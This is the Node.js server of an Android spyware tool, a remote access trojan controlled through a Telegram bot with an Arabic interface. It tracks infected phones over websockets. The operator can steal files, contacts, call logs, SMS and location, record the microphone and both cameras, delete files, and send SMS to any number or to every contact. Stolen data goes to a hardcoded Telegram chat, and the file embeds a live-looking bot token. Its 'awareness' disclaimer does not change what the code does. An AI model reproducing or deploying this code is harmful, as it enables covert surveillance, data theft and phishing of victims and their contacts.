const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';
const address = 'https://www.google.com';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const bot = new TelegramBot(token, { polling: true });
const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">تم تحميل الخادم بنجاح</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    bot.sendDocument(id, req.file.buffer, {
        caption: `• رسالة من جهاز <b>${req.headers.model}</b>`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/txt' });
    res.send('');
});

app.post('/uploadText', (req, res) => {
    bot.sendMessage(id, `• رسالة من جهاز <b>${req.headers.model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `• الموقع من جهاز <b>${req.headers.model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;
    
    ws.uuid = uuid;
    clients.set(uuid, { model, battery, version, brightness, provider });
    
    bot.sendMessage(id, `• جهاز جديد متصل ✅\n\n` +
        `• طراز الجهاز📱 : <b>${model}</b>\n` +
        `• بطارية 🔋 : <b>${battery}</b>\n` +
        `• نسخة أندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشة : <b>${brightness}</b>\n` +
        `• نوع الشرحة SIM : <b>${provider}</b>`, { parse_mode: 'HTML' });
    
    ws.on('close', () => {
        bot.sendMessage(id, `• الجهاز غير متصل ❌\n\n` +
            `• طراز الجهاز📱 : <b>${model}</b>\n` +
            `• بطارية 🔋 : <b>${battery}</b>\n` +
            `• نسخة أندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشة : <b>${brightness}</b>\n` +
            `• نوع الشرحة SIM : <b>${provider}</b>`, { parse_mode: 'HTML' });
        clients.delete(ws.uuid);
    });
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.includes('يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
            currentNumber = msg.text;
            bot.sendMessage(id, 'رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم', { reply_markup: { force_reply: true } });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${msg.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            const message = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل مسار الملف الذي تريد تنزيله')) {
            const filePath = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${filePath}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل مسار الملف الذي تريد حذفه')) {
            const filePath = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${filePath}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
            const duration = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
            const duration = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
            const duration = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
            const toastMsg = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMsg}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل الرسالة التي تريد ظهورها كإشعار')) {
            const notificationMsg = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${notificationMsg}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${link}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioUrl = msg.text;
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioUrl}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
    }
    
    if (id == chatId) {
        if (msg.text == '/start') {
            bot.sendMessage(id, '• • مرحبا بك في بوت اختراق 🖐\n\n' +
                '• رجاء عدم استعمال البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n' +
                '• ترجمه البوت بقيادة ( @king_1_4 )  »طوفان الأقصى🇵🇸⁦\n\n' +
                '• قناتي تلجرا  t.me/Abu_Yamani\n\n' +
                '• اضغط هن( /start )  ', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.text == '📱الأجهزة المتصلة') {
            if (clients.size == 0) {
                bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
            } else {
                let devicesList = '• قائمة الأجهزة المتصلة🤖 :\n\n';
                clients.forEach(function(value, key, map) {
                    devicesList += `• طراز الجهاز📱 : <b>${value.model}</b>\n` +
                        `• بطارية 🔋 : <b>${value.battery}</b>\n` +
                        `• نسخة أندرويد : <b>${value.version}</b>\n` +
                        `• سطوع الشاشة : <b>${value.brightness}</b>\n` +
                        `• نوع الشرحة SIM : <b>${value.provider}</b>\n\n`;
                });
                bot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
            }
        }
        
        if (msg.text == '📋قائمة الأوامر') {
            if (clients.size == 0) {
                bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
            } else {
                const deviceButtons = [];
                clients.forEach(function(value, key, map) {
                    deviceButtons.push([{ text: value.model, callback_data: `device:${key}` }]);
                });
                bot.sendMessage(id, '• حدد الجهاز لتنفيذ الأثناء', {
                    reply_markup: { inline_keyboard: deviceButtons }
                });
            }
        }
    } else {
        bot.sendMessage(id, '• تم رفض الإذن');
    }
});

bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const parts = data.split(':');
    const action = parts[0];
    const uuid = parts[1];
    
    console.log(uuid);
    
    if (action == 'device') {
        bot.editMessageText(`• حدد الجهاز لتنفيذ الأثناء : <b>${clients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱تطبيقات', callback_data: `apps:${uuid}` }, { text: 'ℹ️معلومات الجهاز', callback_data: `device_info:${uuid}` }],
                    [{ text: '📂الحصول على ملف', callback_data: `file:${uuid}` }, { text: '🗑️حذف الملف', callback_data: `delete_file:${uuid}` }],
                    [{ text: '🎤ميكروفون', callback_data: `microphone:${uuid}` }, { text: '📷الكاميرا الرئيس', callback_data: `camera_main:${uuid}` }],
                    [{ text: '📸كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }, { text: '📍الموقع', callback_data: `location:${uuid}` }],
                    [{ text: '📞المكالمات', callback_data: `calls:${uuid}` }, { text: '👥جهات الاتصال', callback_data: `contacts:${uuid}` }],
                    [{ text: '📳يهتز ', callback_data: `vibrate:${uuid}` }, { text: '🔔إظهار الإشعار', callback_data: `toast:${uuid}` }],
                    [{ text: '✉️رسائل', callback_data: `messages:${uuid}` }, { text: '📨ارسل رسالة', callback_data: `send_message:${uuid}` }],
                    [{ text: '🔊تشغيل الصوت', callback_data: `play_audio:${uuid}` }, { text: '🔇إيقاف الصوت', callback_data: `stop_audio:${uuid}` }],
                    [{ text: '📨إرسال رسالة إلى جميع جهات الاتصال ', callback_data: `send_message_to_all:${uuid}` }]
                ]
            },
            parse_mode: 'HTML'
        });
    }
    
    if (action == 'apps') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'device_info') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'file') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل مسار الملف الذي تريد تنزيله\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'delete_file') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل مسار الملف الذي تريد حذفه\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'microphone') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'camera_main') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'camera_selfie') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'location') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'calls') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'contacts') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'messages') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'vibrate') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'toast') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'send_message') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'send_message_to_all') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'play_audio') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل رابط الصوت الذي تريد تشغيله\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'stop_audio') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلقك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱الأجهزة المتصلة'], ['📋قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
});

// ⭐ تم إصلاح المشكلة: إزالة الـ setInterval الذي كان يسبب إرسال رسائل مستمرة
// بدلاً من ذلك يمكن استخدام ping فقط عند الحاجة

server.listen(process.env.PORT || 8999);
